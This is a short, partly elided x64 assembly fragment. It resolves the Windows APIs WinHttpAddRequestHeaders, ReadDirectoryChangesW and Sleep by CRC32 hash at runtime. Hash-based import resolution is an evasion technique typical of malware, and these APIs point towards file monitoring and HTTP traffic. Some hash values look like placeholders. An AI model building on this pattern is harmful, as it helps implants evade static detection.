...
CRC32_WinHttpAddRequestHeaders  EQU 0A1B2C3D4h
CRC32_ReadDirectoryChangesW     EQU 0B2C3D4E5h
CRC32_Sleep                     EQU 0DAEBFC0Dh

; Global API pointers (resolved at runtime)
pWinHttpAddRequestHeaders       DQ 0
pReadDirectoryChangesW          DQ 0
pSleep                          DQ 0
...
Initialize_Sovereign_APIs PROC
    ...
    mov rcx, CRC32_WinHttpAddRequestHeaders
    call Resolve_API_By_CRC32
    mov pWinHttpAddRequestHeaders, rax
    
    mov rcx, CRC32_ReadDirectoryChangesW
    call Resolve_API_By_CRC32
    mov pReadDirectoryChangesW, rax
